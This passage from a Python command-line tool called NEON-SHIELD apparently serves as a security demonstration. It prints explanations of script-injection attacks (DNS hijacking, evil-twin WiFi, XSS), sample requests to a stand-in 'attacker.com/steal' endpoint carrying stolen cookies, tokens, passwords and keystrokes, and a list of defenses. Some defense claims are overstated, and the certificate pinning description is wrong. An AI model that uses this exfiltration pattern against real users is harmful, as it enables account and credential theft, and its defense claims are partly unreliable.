  5. JavaScript runs silently in background
  6. All data exfiltrated to attacker's server

[bold]Method 2: DNS Hijacking[/bold]
  1. NEON-SHIELD redirects {domain} to fake server
  2. Fake server serves malicious page with payload
  3. Victim thinks they're on real site
  4. Payload steals everything

[bold]Method 3: WiFi Evil Twin Redirect[/bold]
  1. All traffic on fake WiFi redirects to attacker's server
  2. Server injects payload into every page
  3. Victim's browser runs injected code

[bold]Method 4: XSS Vulnerability[/bold]
  1. Site has XSS vulnerability in search bar
  2. Attacker submits: <script>...injection...</script>
  3. Site reflects payload to all users
  4. All browsers run attacker's code
""")

    console.print("\n[bold red]WHAT ATTACKER SEES ON THEIR SERVER:[/bold red]\n")

    console.print("""
[bold]Request 1: Initial Steal[/bold]
  POST /steal HTTP/1.1
  Host: attacker.com:8888

  {
    "event": "initial_steal",
    "domain": "gmail.com",
    "cookies": "GMAIL_AUTH_TOKEN=abc123def456...",
    "localStorage": {
      "user_preferences": "...",
      "saved_passwords": "..."
    },
    "sessionStorage": {
      "auth_token": "eyJhbGci...",
      "user_id": "12345"
    },
    "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
  }

[bold]Request 2: Form Submission (Login attempt)[/bold]
  POST /steal HTTP/1.1

  {
    "event": "form_submission",
    "domain": "gmail.com",
    "credentials": {
      "email": "victim@gmail.com",
      "password": "MyPassword123",
      "remember": "on"
    }
  }

[bold]Request 3: Keylog[/bold]
  POST /steal HTTP/1.1

  {
    "event": "keylog",
    "keylog": "1234567890"  // Typed credit card number!
  }

[bold]Request 4: Clipboard Copy[/bold]
  POST /steal HTTP/1.1

  {
    "event": "clipboard_copy",
    "data": "MyBankPassword123"
  }
""")

    console.print("\n[bold green]✅ DEFENSES AGAINST THIS:[/bold green]\n")

    console.print("""
[bold]1. Content-Security-Policy (CSP)[/bold]
   Server header: Content-Security-Policy: script-src 'self'
   Effect: Only allows scripts from same origin
   Result: Injected scripts are blocked

[bold]2. Subresource Integrity (SRI)[/bold]
   <script src="jquery.js" integrity="sha384-..."></script>
   Effect: Verifies script hasn't been modified
   Result: Modified/injected scripts fail to load

[bold]3. Ad Blockers / uBlock Origin[/bold]
   Effect: Blocks malicious scripts before execution
   Result: Payload never runs

[bold]4. NoScript Extension[/bold]
   Effect: Disables JavaScript by default
   Result: No scripts run at all

[bold]5. VPN[/bold]
   Effect: Attacker can't intercept traffic in first place
   Result: No injection possible

[bold]6. HTTPS + Certificate Pinning[/bold]
   Effect: Only accept certificates from trusted CAs
   Result: Can't do MITM even with fake certs
""")


cli.add_command(cli_phase2)


def main():
    """Entry point."""
    # Only require root for commands that actually need it, not for help
    needs_root_commands = ("start", "stop", "cleanup")
    if (os.geteuid() != 0 and len(sys.argv) > 1 and
        sys.argv[1] in needs_root_commands and "--help" not in sys.argv):
        console.print("[red]Error: This command requires root privileges.[/red]")
        console.print("Retry with: sudo neon-shield " + " ".join(sys.argv[1:]))
        sys.exit(1)

    cli()


if __name__ == "__main__":
    main()
